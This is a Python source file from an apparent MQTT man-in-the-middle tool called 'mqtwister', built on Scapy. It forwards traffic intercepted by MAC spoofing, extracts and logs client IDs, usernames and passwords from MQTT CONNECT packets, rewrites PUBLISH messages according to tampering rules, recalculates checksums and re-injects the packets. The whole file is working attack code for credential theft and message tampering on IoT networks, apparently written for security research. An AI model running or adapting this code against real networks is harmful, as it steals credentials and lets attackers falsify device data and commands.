# SPDX-FileCopyrightText: 2025 Daniel Feito-Pin <danielfeitopin+github@protonmail.com>
#
# SPDX-License-Identifier: GPL-2.0-only

from scapy.all import Packet, sendp
from scapy.contrib.mqtt import (
    MQTT, MQTTConnect, MQTTPublish, CONTROL_PACKET_TYPE 
)
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP

from mqtwister.config import MQTT_PORT
from mqtwister.processor.tampering import alter_MQTTPublish_packet
from mqtwister.processor.tampering.packet import (
    get_layers, reassemble_packet, recalculate_values
)
from mqtwister.utils.logging import logger
from mqtwister.utils.network import get_arp_table
from mqtwister.lang import get_message as m


def process_MQTTConnect(packet: MQTT, credentials: set) -> None:

    # Get MQTT message layers
    connect: MQTTConnect = packet[MQTTConnect]
    client_id: bytes = connect.clientId
    username: bytes | None = connect.username
    password: bytes | None = connect.password

    # Detect credentials
    if client_id != b'' or username is not None or password is not None:

        # Decode bytes to strings
        client_id: str = client_id.decode()
        username: str = username.decode() if username is not None else ''
        password: str = password.decode() if password is not None else ''

        # Update credentials set
        credentials.add((client_id, username, password))

        # Log message
        logger.info(m('info_credentials_found', client_id, username, password))

    return None


def process_MQTTPublish(packet: MQTT, rules: dict) -> None:

    # Get MQTT message layers
    layers: list[Packet] = get_layers(packet[MQTT])

    # DEBUG
    # print(f"Layers ({len(layers)}): {layers}")

    for layer in layers:
        if isinstance(layer, MQTTPublish):
            alter_MQTTPublish_packet(layer, rules)

    # Reassemble MQTT message layers
    packet[MQTT] = reassemble_packet(layers)

    # Recalculate lengths and checksums
    del packet[MQTT].len
    recalculate_values(packet)

    return None


def packet_callback(packet: Packet, context: dict) -> None:

    # Don't process not TCP packets
    if not packet.haslayer(TCP):
        return None

    # Don't process packets sent by the own host
    if (ether_src := packet[Ether].src) == context['lmac']:
        return None

    # Only process MQTT or MQTT-related TCP packets to the listening port
    lport: int = context.get('lport', MQTT_PORT)
    if not (lport in {packet[TCP].sport, packet[TCP].dport}):
        return None

    # DEBUG
    # logger.debug("Received packet:")
    # logger.debug(packet.show(dump=True))

    # Revert MAC spoofing
    packet[Ether].src = context['lmac']
    packet[Ether].dst = get_arp_table().get(packet[IP].dst)

    # Log MQTT packet received
    if packet.haslayer(MQTT):
        logger.debug(m(
            'debug_mqtt_packet_received',
            CONTROL_PACKET_TYPE.get(packet[MQTT].type, ''),
            ether_src, packet[IP].src, packet[TCP].sport,
            packet[Ether].dst, packet[IP].dst, packet[TCP].dport
        ))

    # Process MQTT packets
    if packet.haslayer(MQTTConnect):
        process_MQTTConnect(packet, context.setdefault('credentials', set()))

    if packet.haslayer(MQTTPublish):
        process_MQTTPublish(packet, context.setdefault('rules', []))

    # DEBUG
    # logger.debug("Processed packet:")
    # logger.debug(packet.show2(dump=True))

    sendp(packet, iface=context.get('ifname'), verbose=False)
    return None
